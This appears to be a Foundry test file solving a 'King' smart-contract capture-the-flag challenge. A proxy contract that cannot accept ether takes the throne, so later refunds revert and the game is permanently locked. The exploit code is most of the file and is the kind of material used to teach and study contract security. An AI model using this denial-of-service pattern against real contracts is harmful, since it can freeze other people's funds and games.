// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "src/King.sol";
import "forge-std/Test.sol";

contract KingTest is Test {
    King private king;
    Proxy private proxy;
    address private constant HACKER = address(0x1);
    address private constant ALICE = address(0x2);
    function setUp() external {
        vm.deal(ALICE, 2e18);
        vm.startPrank(ALICE);
        king = (new King){value: 2e18}();
        vm.stopPrank();
        proxy = new Proxy();
        vm.deal(HACKER, 10e18);
        vm.startPrank(HACKER);
    }
    
    function testHack() external {
       (bool success, ) = address(proxy).call{value:4e18}(abi.encodeWithSignature("ddos(address)", address(king)));
       require(success, "tx failed");
       assertEq(king.king(), address(proxy));
    }
}

contract Proxy {
    function ddos(address _victim) external payable {
       (bool success, ) = _victim.call{value: msg.value}("");
       require(success, "tx1 failed");
    }
}